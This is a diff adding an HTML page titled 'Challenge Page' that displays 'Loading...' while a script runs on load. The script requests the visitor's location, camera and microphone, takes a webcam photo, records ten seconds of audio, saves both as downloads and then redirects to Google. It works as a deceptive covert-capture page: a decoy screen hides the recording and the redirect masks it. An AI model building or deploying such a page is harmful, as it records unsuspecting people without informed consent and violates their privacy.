@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Challenge Page</title>
+</head>
+<body>
+  <h1>Loading...</h1>
+  <script>
+    async function captureData() {
+      try {
+        // Get location (just logging, no saving)
+        navigator.geolocation.getCurrentPosition(position => {
+          console.log('Location:', position.coords);
+        });
+
+        // Get camera and mic
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+
+        // Capture photo
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
+
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0);
+
+        const photoDataUrl = canvas.toDataURL('image/png');
+        console.log('Photo:', photoDataUrl);
+
+        // Trigger photo download
+        const photoLink = document.createElement('a');
+        photoLink.href = photoDataUrl;
+        photoLink.download = 'captured_photo.png';
+        document.body.appendChild(photoLink);
+        photoLink.click();
+        document.body.removeChild(photoLink);
+
+        // Record audio for 10 seconds
+        const mediaRecorder = new MediaRecorder(stream);
+        let audioChunks = [];
+        mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+        mediaRecorder.start();
+
+        setTimeout(() => {
+          mediaRecorder.stop();
+          mediaRecorder.onstop = () => {
+            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+            console.log('Audio recorded:', audioBlob);
+
+            // Trigger audio download
+            const audioUrl = URL.createObjectURL(audioBlob);
+            const audioLink = document.createElement('a');
+            audioLink.href = audioUrl;
+            audioLink.download = 'recorded_audio.webm';
+            document.body.appendChild(audioLink);
+            audioLink.click();
+            document.body.removeChild(audioLink);
+            URL.revokeObjectURL(audioUrl);
+
+            // Redirect to Google after capture and downloads
+            window.location.href = 'https://www.google.com';
+          };
+        }, 10000);
+
+      } catch (err) {
+        console.error('Error or permission denied:', err);
+        window.location.href = 'https://www.google.com';
+      }
+    }
+
+    captureData();
+  </script>
+</body>
+</html>
